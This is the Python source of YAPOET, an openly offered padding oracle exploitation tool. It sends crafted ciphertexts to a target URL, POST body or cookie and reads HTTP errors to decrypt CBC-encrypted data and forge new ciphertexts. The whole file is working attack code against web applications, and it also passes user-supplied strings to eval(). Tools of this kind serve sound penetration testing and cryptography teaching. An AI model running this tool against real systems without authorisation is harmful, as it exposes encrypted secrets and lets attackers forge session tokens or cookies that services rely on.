#!/usr/bin/env python

import errno
import optparse
import random
import urllib.error
import urllib.parse
import urllib.request


class Yapoet:

    def __init__(self, url, post_data, cookie, block_size, iv, mode, encode_func, decode_func):
        self._url = url
        self._post_data = post_data
        self._cookie = cookie
        self._block_size = block_size
        self._iv = iv
        self._mode = mode
        self._encode_func = encode_func
        self._decode_func = decode_func
        self._requests_count = 0

    def _is_valid_padding(self, encrypted_data):
        specify = lambda s: s.replace("%encrypted_data%",
                                      urllib.parse.quote(self._encode_func(encrypted_data)))
        url = specify(self._url)
        post_data = specify(self._post_data).encode() if self._post_data else None
        cookie = {"Cookie": specify(self._cookie)} if self._cookie else {}
        try:
            self._requests_count += 1
            urllib.request.urlopen(urllib.request.Request(url, post_data, cookie))
            return True
        except urllib.error.HTTPError:
            return False
        except urllib.error.URLError:
            print("\n\nERROR: host is unreachable")
            exit(errno.EHOSTUNREACH)

    def _decrypt_block_cbc(self, encrypted_block):
        probing_bytes = bytearray(b'\0' * self._block_size + encrypted_block)
        intermediate_bytes = bytearray(b'\0' * self._block_size)
        byte_index = self._block_size - 1
        while byte_index >= 0:
            padding_size = self._block_size - byte_index
            for j in range(byte_index + 1, self._block_size):
                probing_bytes[j] = intermediate_bytes[j] ^ padding_size
            probing_bytes[byte_index] = 1
            probes_count = 0
            while probes_count < 256:
                probes_count += 1
                if self._is_valid_padding(probing_bytes):
                    intermediate_bytes[byte_index] = probing_bytes[byte_index] ^ padding_size
                    print("%s," % hex(intermediate_bytes[byte_index]), end=' ')
                    break
                else:
                    if probing_bytes[byte_index] == 0:
                        print("can't decrypt block")
                        return None
                    probing_bytes[byte_index] = probing_bytes[byte_index] + 1 if probing_bytes[byte_index] != 255 else 0
            byte_index -= 1
        return intermediate_bytes

    def decrypt_text_cbc(self, encrypted_data):
        self._requests_count = 0
        encrypted_bytes = self._decode_func(encrypted_data)
        decrypted_data = ''
        block_index = len(encrypted_bytes) - self._block_size
        while block_index >= 0:
            print("\n\tProcessing block #%s:" % int(block_index / self._block_size), end=' ')
            cipher_block = encrypted_bytes[block_index: block_index + self._block_size]
            if block_index > 0:
                prev_block = encrypted_bytes[block_index - self._block_size: block_index]
            else:
                prev_block = self._iv
            decrypted_block = self._decrypt_block_cbc(cipher_block)
            if decrypted_block == None:
                return None
            for idx, val in enumerate(decrypted_block):
                decrypted_data = chr(val ^ prev_block[idx]) + decrypted_data
            block_index -= self._block_size
        return str(decrypted_data[::-1].rstrip(decrypted_data[0])), self._requests_count

    def _encrypt_block_cbc(self, plain_block, iv):
        encrypted_block = bytearray(b'\0' * self._block_size)
        decrypted_block = self._decrypt_block_cbc(iv)
        if decrypted_block != None:
            for idx, val in enumerate(decrypted_block):
                encrypted_block[idx] = val ^ plain_block[idx]
            return encrypted_block
        else:
            print("can't encrypt block")
            return None

    def encrypt_text_cbc(self, plain_data):
        self._requests_count = 0
        padding_length = self._block_size - len(plain_data) % self._block_size
        padded_data = plain_data.encode() + bytearray([padding_length] * padding_length)
        encrypted_text = bytearray()
        block_index = len(padded_data) - self._block_size
        iv = bytearray(random.getrandbits(8) for _ in range(self._block_size))
        while block_index >= 0:
            print("\n\tProcessing block #%s:" % int(block_index / self._block_size), end=' ')
            encrypted_text = iv + encrypted_text
            iv = self._encrypt_block_cbc(padded_data[block_index: block_index + self._block_size], iv)
            if iv == None:
                return None
            block_index -= self._block_size
        return self._encode_func(iv + encrypted_text).decode(), self._requests_count


if __name__ == "__main__":

    print("YAPOET: Yet Another Padding Oracle Exploitation Tool v0.3.0")
    print("by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>")
    print("https://github.com/kochetkov/Yapoet\n")

    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url",
                      help="Target URL (e.g. \"http://host.domain/?param1=value%2b1&param2=value%2b2\")")
    parser.add_option("-d", "--decrypt", dest="encrypted_data", help="Base64-encoded data to decrypt")
    parser.add_option("-e", "--encrypt", dest="plaintext_data", help="Plaintext data to encrypt (CBC mode only)")
    parser.add_option("--data", dest="post_data", help="POST data (e.g. \"param1=value%2b1&param2=value%2b1\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--block-size", dest="block_size", help="Cipher block size in bytes [default: %default]")
    parser.add_option("--iv", dest="iv",
                      help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
    parser.add_option("--mode", dest="mode", help="Mode of operation (\"CBC\") [default: %default]")
    parser.add_option("--encode-func", dest="encode_func",
                      help="Function to encode byte array data to string [default: %default]")
    parser.add_option("--decode-func", dest="decode_func",
                      help="Function to decode string from byte array data [default: %default]")
    parser.set_defaults(
        block_size=16,
        mode="CBC",
        encode_func="lambda byte_array: __import__('base64').b64encode(byte_array)",
        decode_func="lambda string: __import__('base64').b64decode(string)",
    )
    options, _ = parser.parse_args()

    if options.url and (options.encrypted_data or options.plaintext_data):
        if options.iv:
            options_iv = bytearray([int(i, 0) for i in options.iv.split(",")])
            if len(options_iv) != options.block_size:
                print("IV length must be equal to the BLOCK_SIZE value")
                exit(errno.EINVAL)
        else:
            options_iv = bytearray(b'\0' * options.block_size)
        if options.mode != "CBC":
            print("Possible value for MODE is only \"CBC\"")
            exit(errno.EINVAL)
        poet = Yapoet(options.url, options.post_data, options.cookie, options.block_size, options_iv, options.mode,
                      eval(options.encode_func), eval(options.decode_func))
        print("Using %s mode of operation, block size = %s bytes and IV = %s\n" % (
            options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv)))
        if options.encrypted_data:
            print("Started decryption of '''%s'''" % options.encrypted_data)
            result = poet.decrypt_text_cbc(options.encrypted_data)
            if result != None:
                print("\n\nData has been decrypted to '''%s''' via %s requests\n" % result)
            else:
                print("\n\n\Data were not decrypted: unexploitable or missing oracle")
        if options.plaintext_data:
            if options.mode != "CBC":
                print("Encryption is possible only in CBC mode")
                exit(errno.EINVAL)
            print("Started encryption of '''%s'''" % options.plaintext_data)
            result = poet.encrypt_text_cbc(options.plaintext_data)
            if result != None:
                print("\n\nData has been encrypted to '''%s''' via %s requests" % result)
            else:
                print("\n\n\Data were not encrypted: unexploitable or missing oracle")
    else:
        parser.print_help()
        print("\nPlease note that the position of attacking data in URL, POST_DATA or COOKIE"
              "\noptions should be picked by the %encrypted_data% placeholder")